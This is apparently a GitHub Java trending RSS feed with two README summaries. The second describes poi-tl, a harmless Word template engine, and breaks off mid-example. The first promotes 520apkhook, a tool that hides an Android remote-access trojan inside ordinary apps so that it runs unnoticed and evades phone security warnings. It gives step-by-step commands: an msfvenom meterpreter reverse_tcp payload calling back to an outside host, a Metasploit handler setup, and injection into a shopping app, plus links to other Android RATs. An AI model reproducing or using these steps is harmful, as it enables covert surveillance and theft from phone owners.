<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Java Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-06-09T01:39:56Z</updated>
  <subtitle>Daily Trending of Java in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>ba0gu0/520apkhook</title>
    <updated>2023-06-09T01:39:56Z</updated>
    <id>tag:github.com,2023-06-09:/ba0gu0/520apkhook</id>
    <link href="https://github.com/ba0gu0/520apkhook" rel="alternate"></link>
    <summary type="html">&lt;p&gt;将安卓远控Apk附加进普通的App中，运行新生成的App时，普通App正常运行，远控正常上线。Attach the Android remote control APK to a regular app. When running the newly generated app, the regular app runs normally and the remote control goes online normally.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;520_APK_HOOK&lt;/h1&gt; &#xA;&lt;h2&gt;介绍&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;将编写的安卓远控程序，注入到正常的App中，运行app时安卓远控程序也会上线。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;修复上一版本的bug，使用java重写，同时还重写了520ApkBox程序，专门用来运行运行APP和远控App。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;520ApkBox是一个java编写的App，主要作用是一个安卓虚拟机，任何App可以不用任何修改就可以正常运行，可以绕过现在各种App的安全检测。同时此App还是一个加载器，通过DexClassesLoder加载远控的Dex文件并启动上线。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;520ApkHook是Java编写的注入工具，将被注入的App和远控App注入到一个App中。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;项目地址: &lt;a href=&#34;https://github.com/ba0gu0/520apkhook&#34;&gt;https://github.com/ba0gu0/520apkhook&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;作者: BaoGuo&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;版本升级&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;2023-06-05&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;上版本忘记添加32位app支持，此次升级加入32位app支持。更换了虚拟机项目依赖，稳定性更好一下。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;支持安卓5-12版本，不支持最新的安卓13。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;问题1、目前有问题的app，微信、ES文件浏览器。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;问题2、被注入的app读取到的文件、图片、通讯录、短信是虚拟机的内容，但是注入的payload获取到的是实体机的内容。&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;优点&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;相比于普通的安卓远控，此版本app在进行远控时，被注入的app可以正常运行。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;注入后的app在安装时，手机管家不会有任何安全提示，普通的远控程序，安装时手机管家会有安全警示。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;理论上来说，只要远控软件使用的是纯Java或者Kotlin编写，就可以使用，不一定必须是msf生成的apk。&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;使用&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;下载Releases中打包好的jar包&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ba0gu0/520apkhook/releases/download/v2.0/a520ApkHook-1.0-jar-with-dependencies.jar&#34;&gt;a520ApkHook-1.0-jar-with-dependencies.jar&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;msfmsfvenom&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&#xA;msfvenom -p android/meterpreter/reverse_tcp lhost=114.114.114.114 lport=3306 -o ~/Downloads/msf.apk&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;msfconsole&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 启动 msfconsole&#xA;&#xA;use exploit/multi/handler&#xA;set payload android/meterpreter/reverse_tcp&#xA;set lhost 0.0.0.0&#xA;set lport 3306&#xA;set exitonsession false&#xA;exploit -j&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;520ApkHook&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&#xA;java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Downloads/msf.apk&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;BaoGuo仍给你一个Apk，请安装它!&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;搭配其他远控使用&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;一款安卓僵尸网络远控工具, 服务端是web网页, 基于&lt;a href=&#34;https://deta.space&#34;&gt;https://deta.space&lt;/a&gt; 搭建(匿名):&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/ScRiPt1337/Teardroid-phprat&#34;&gt;https://github.com/ScRiPt1337/Teardroid-phprat&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;一款安卓远控程序, 服务端是GUI程序:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/AhMyth/AhMyth-Android-RAT&#34;&gt;https://github.com/AhMyth/AhMyth-Android-RAT&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;搜集的一些github上的安卓远控项目:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/wishihab/Android-RATList&#34;&gt;https://github.com/wishihab/Android-RATList&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;BUG&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;微信、ES文件浏览器只能通过应用克隆的方式安装，需要先指定微信的apk包，生成520ApkHook.apk. 再使用np管理器把assets目录下的和对应apk大小一样的文件给删除掉。再使用np管理器重新进行签名即可.（这种方法要求目标机器上要已经安装微信.）&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;新生成的apk的包名字, 不能和被注入的apk包名字一样, 程序默认已经修改.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;msf无法在鸿蒙OS使用, 文件读取在鸿蒙OS上也无法正常使用.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;其他未测试...&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;项目依赖&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;本项目参考以下项目&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;由于安卓虚拟化牵扯到其他github上被下架的程序，在这里不再进行列出，避免被影响。&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;重点说明&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;本项目仅用于安全研究, 禁止利用脚本进行攻击, 使用本脚本产生的一切问题和本人无关.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;由于此软件是基于安卓虚拟化来实现的，虚拟化软件对于不同版本的系统会出现BUG，可以自行修改520ApkBox项目源码 (欢迎大佬提交pull) .&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Start 曲线&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/ba0gu0/520apkhook&#34;&gt;&lt;img src=&#34;https://starchart.cc/ba0gu0/520apkhook.svg?sanitize=true&#34; alt=&#34;Start 曲线&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Sayi/poi-tl</title>
    <updated>2023-06-09T01:39:56Z</updated>
    <id>tag:github.com,2023-06-09:/Sayi/poi-tl</id>
    <link href="https://github.com/Sayi/poi-tl" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Generate awesome word(docx) with template&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;poi-tl(poi-template-language)&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://app.travis-ci.com/Sayi/poi-tl&#34;&gt;&lt;img src=&#34;https://app.travis-ci.com/Sayi/poi-tl.svg?branch=master&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/jdk-1.6%2B-orange.svg?sanitize=true&#34; alt=&#34;jdk1.6+&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/jdk-1.8-orange.svg?sanitize=true&#34; alt=&#34;jdk1.8&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/apache--poi-3.16%2B-blue.svg?sanitize=true&#34; alt=&#34;poi3.16%2B&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/apache--poi-5.1.0-blue.svg?sanitize=true&#34; alt=&#34;poi5.1.0&#34;&gt; &lt;a href=&#34;https://gitter.im/Sayi/poi-tl?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&#34;&gt;&lt;img src=&#34;https://badges.gitter.im/Sayi/poi-tl.svg?sanitize=true&#34; alt=&#34;Gitter&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A better way to generate word(docx) with template，based on Apache POI。&lt;/p&gt; &#xA;&lt;h2&gt;What is poi-tl&lt;/h2&gt; &#xA;&lt;p&gt;FreeMarker or Velocity generates new html pages or configuration files based on text template and data. poi-tl is a Word template engine that generates &lt;strong&gt;new documents&lt;/strong&gt; based on &lt;strong&gt;Word template&lt;/strong&gt; and &lt;strong&gt;data&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The Word template has rich styles. Poi-tl will perfectly retain the styles in the template in the generated documents. You can also set styles for the tags. The styles of the tags will be applied to the replaced text, so you can focus on the template design.&lt;/p&gt; &#xA;&lt;p&gt;poi-tl is a &lt;em&gt;&#34;logic-less&#34;&lt;/em&gt; template engine. There is no complicated control structure and variable assignment, only &lt;strong&gt;tags&lt;/strong&gt;, some tags can be replaced with text, pictures, tables, etc., some tags will hide certain some document content, while other tags will loop a series of document content.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&#34;Powerful&#34; constructs like variable assignment or conditional statements make it easy to modify the look of an application within the template system exclusively... however, at the cost of separation, turning the templates themselves into part of the application logic.&lt;/p&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://github.com/OlafvdSpek/ctemplate/raw/master/doc/guide.html&#34;&gt;《Google CTemplate》&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;poi-tl supports &lt;strong&gt;custom functions (plug-ins)&lt;/strong&gt;, functions can be executed anywhere in the Word template, do anything anywhere in the document is the goal of poi-tl.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Feature&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Text&lt;/td&gt; &#xA;   &lt;td&gt;Render the tag as text&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Picture&lt;/td&gt; &#xA;   &lt;td&gt;Render the tag as a picture&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Table&lt;/td&gt; &#xA;   &lt;td&gt;Render the tag as a table&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Numbering&lt;/td&gt; &#xA;   &lt;td&gt;Render the tag as a numbering&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Chart&lt;/td&gt; &#xA;   &lt;td&gt;Bar chart (3D bar chart), column chart (3D column chart), area chart (3D area chart), line chart (3D line chart), radar chart, pie chart (3D pie Figure) and other chart rendering&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; If Condition&lt;/td&gt; &#xA;   &lt;td&gt;Hide or display certain document content (including text, paragraphs, pictures, tables, lists, charts, etc.) according to conditions&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Foreach Loop&lt;/td&gt; &#xA;   &lt;td&gt;Loop through certain document content (including text, paragraphs, pictures, tables, lists, charts, etc.) according to the collection&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Loop table row&lt;/td&gt; &#xA;   &lt;td&gt;Loop to copy a row of the rendered table&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Loop table column&lt;/td&gt; &#xA;   &lt;td&gt;Loop copy and render a column of the table&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Loop ordered list&lt;/td&gt; &#xA;   &lt;td&gt;Support the loop of ordered list, and support multi-level list at the same time&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Highlight code&lt;/td&gt; &#xA;   &lt;td&gt;Word highlighting of code blocks, supporting 26 languages ​​and hundreds of coloring styles&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Markdown&lt;/td&gt; &#xA;   &lt;td&gt;Convert Markdown to a word document&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Word attachment&lt;/td&gt; &#xA;   &lt;td&gt;Insert attachment in Word&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Word Comments&lt;/td&gt; &#xA;   &lt;td&gt;Complete support comment, create comment, modify comment, etc.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Word SDT&lt;/td&gt; &#xA;   &lt;td&gt;Complete support structured document tag&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Textbox&lt;/td&gt; &#xA;   &lt;td&gt;Tag support in text box&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Picture replacement&lt;/td&gt; &#xA;   &lt;td&gt;Replace the original picture with another picture&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; bookmarks, anchors, hyperlinks&lt;/td&gt; &#xA;   &lt;td&gt;Support setting bookmarks, anchors and hyperlinks in documents&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Expression Language&lt;/td&gt; &#xA;   &lt;td&gt;Fully supports SpringEL expressions and can extend more expressions: OGNL, MVEL...&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Style&lt;/td&gt; &#xA;   &lt;td&gt;The template is the style, and the code can also set the style&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Template nesting&lt;/td&gt; &#xA;   &lt;td&gt;The template contains sub-templates, and the sub-templates then contain sub-templates&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; Merge&lt;/td&gt; &#xA;   &lt;td&gt;Word merge Merge, you can also merge in the specified position&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;span&gt;✅&lt;/span&gt; custom functions (plug-ins)&lt;/td&gt; &#xA;   &lt;td&gt;Plug-in design, execute function anywhere in the document&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;TOC&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Maven&#34;&gt;Maven&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Quick-start&#34;&gt;Quick start&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Tags&#34;&gt;Tags&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Text&#34;&gt;Text&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Picture&#34;&gt;Picture&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Table&#34;&gt;Table&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Numbering&#34;&gt;Numbering&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Sections&#34;&gt;Sections&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#False-Values-or-Empty-collection&#34;&gt;False Values or Empty collection&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Non-False-Values-and-Not-a-collection&#34;&gt;Non-False Values and Not a collection&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Non-Empty-collection&#34;&gt;Non-Empty collection&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Nesting&#34;&gt;Nesting&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Documentation-and-examples&#34;&gt;Documentation and examples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#Contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Sayi/poi-tl/master/#FAQ&#34;&gt;FAQ&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Maven&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;dependency&amp;gt;&#xA;  &amp;lt;groupId&amp;gt;com.deepoove&amp;lt;/groupId&amp;gt;&#xA;  &amp;lt;artifactId&amp;gt;poi-tl&amp;lt;/artifactId&amp;gt;&#xA;  &amp;lt;version&amp;gt;1.12.1&amp;lt;/version&amp;gt;&#xA;&amp;lt;/dependency&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;NOTE: poi-tl &lt;code&gt;1.12.x&lt;/code&gt; requires POI version &lt;code&gt;5.2.2+&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Quick start&lt;/h2&gt; &#xA;&lt;p&gt;Start with a deadly simple example: replace &lt;code&gt;{{title}}&lt;/code&gt; with &#34;poi-tl template engine&#34;.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Create a new document &lt;code&gt;template.docx&lt;/code&gt;, including the content &lt;code&gt;{{title}}&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;TDO mode: Template + data-model = output&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;//The core API uses a minimalist design, only one line of code is required&#xA;XWPFTemplate.compile(&#34;template.docx&#34;).render(new HashMap&amp;lt;String, Object&amp;gt;(){{&#xA;         put(&#34;title&#34;, &#34;poi-tl template engine&#34;);&#xA;}}).writeToFile(&#34;out_template.docx&#34;);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Open the &lt;code&gt;out_template.docx&lt;/code&gt; document, everything is as you wish.&lt;/p&gt; &#xA;&lt;h2&gt;Tags&lt;/h2&gt; &#xA;&lt;p&gt;The tag consists of two curly braces, &lt;code&gt;{{title}}&lt;/code&gt; is a tag, &lt;code&gt;{{?title}}&lt;/code&gt; is also a tag, &lt;code&gt;title&lt;/code&gt; is the name of the tag, and &lt;code&gt;?&lt;/code&gt; identifies the type of tag. Next, we Let’s see what tag types are there.&lt;/p&gt; &#xA;&lt;h3&gt;Text&lt;/h3&gt; &#xA;&lt;p&gt;The text tag is the most basic tag type in the Word template. &lt;code&gt;{{name}}&lt;/code&gt; will be replaced by the value of key &lt;code&gt;name&lt;/code&gt; in the data model. If the key is not exist, the tag will be cleared(The program can configure whether to keep the tag or throw an exception).&lt;/p&gt; &#xA;&lt;p&gt;The style of the text tag will be applied to the replaced text, as shown in the following example.&lt;/p&gt; &#xA;&lt;p&gt;Code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;put(&#34;name&#34;, &#34;Mama&#34;);&#xA;put(&#34;thing&#34;, &#34;chocolates&#34;);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Template:&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;{{name}}&lt;/strong&gt; always said life was like a box of {{thing}}.&lt;/p&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Mama&lt;/strong&gt; always said life was like a box of chocolates.&lt;/p&gt; &#xA;&lt;h3&gt;Picture&lt;/h3&gt; &#xA;&lt;p&gt;The image tag starts with &lt;code&gt;@&lt;/code&gt;, for example, &lt;code&gt;{{@logo}}&lt;/code&gt; will look for the value with the key of &lt;code&gt;logo&lt;/code&gt; in the data model, and then replace the tag with the image. The data corresponding to the image tag can be a simple URL or Path string, or a structure containing the width and height of the image.&lt;/p&gt; &#xA;&lt;p&gt;Code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;put(&#34;watermelon&#34;, &#34;assets/watermelon.png&#34;);&#xA;put(&#34;watermelon&#34;, &#34;http://x/lemon.png&#34;);&#xA;put(&#34;lemon&#34;, Pictures.ofLocal(&#34;sob.jpeg&#34;, PictureType.JPEG).size(24, 24).create());&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Fruit Logo:&#xA;watermelon {{@watermelon}}&#xA;lemon {{@lemon}}&#xA;banana {{@banana}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Fruit Logo:&#xA;watermelon 🍉&#xA;lemon 🍋&#xA;banana 🍌&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Table&lt;/h3&gt; &#xA;&lt;p&gt;The table tag starts with &lt;code&gt;#&lt;/code&gt;, such as &lt;code&gt;{{#table}}&lt;/code&gt;, it will be rendered as a Word table with N rows and N columns. The value of N depends on the data of the &lt;code&gt;table&lt;/code&gt; tag.&lt;/p&gt; &#xA;&lt;p&gt;Code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;put(&#34;table&#34;, Tables.of(new String[][] {&#xA;                new String[] { &#34;Song name&#34;, &#34;Artist&#34; }&#xA;            }).border(BorderStyle.DEFAULT).create());&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{#table}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td&gt;Song name&lt;/td&gt;&#xA;   &lt;td&gt;Artist&lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Numbering&lt;/h3&gt; &#xA;&lt;p&gt;The list tag corresponds to Word&#39;s symbol list or numbered list, starting with &lt;code&gt;*&lt;/code&gt;, such as &lt;code&gt;{{*number}}&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;put(&#34;list&#34;, Numberings.create(&#34;Plug-in grammar&#34;,&#xA;                  &#34;Supports word text, pictures, table...&#34;,&#xA;                  &#34;Template, not just template, but also style template&#34;));&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{*list}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;● Plug-in grammar&#xA;● Supports word text, pictures, table...&#xA;● Templates, not just templates, but also style templates&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Sections&lt;/h3&gt; &#xA;&lt;p&gt;A section is composed of two tags before and after, the start tag is identified by &lt;code&gt;?&lt;/code&gt;, and the end tag is identified by &lt;code&gt;/&lt;/code&gt;, such as &lt;code&gt;{{?section}}&lt;/code&gt; as the start tag of the sections block, &lt;code&gt;{{/section} }&lt;/code&gt; is the end tag, and &lt;code&gt;section&lt;/code&gt; is the name of this section.&lt;/p&gt; &#xA;&lt;p&gt;Sections are very useful when processing a series of document elements. Document elements (text, pictures, tables, etc.) located in a section can be rendered zero, one or N times, depending on the value of the section.&lt;/p&gt; &#xA;&lt;h4&gt;False Values or Empty collection&lt;/h4&gt; &#xA;&lt;p&gt;If the value of the section is &lt;code&gt;null&lt;/code&gt;, &lt;code&gt;false&lt;/code&gt; or an empty collection, all document elements located in the section will &lt;strong&gt;not be displayed&lt;/strong&gt;, similar to the condition of the if statement is &lt;code&gt;false&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Datamodel:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;announce&#34;: false&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Made it,Ma!{{?announce}}Top of the world!{{/announce}}&#xA;Made 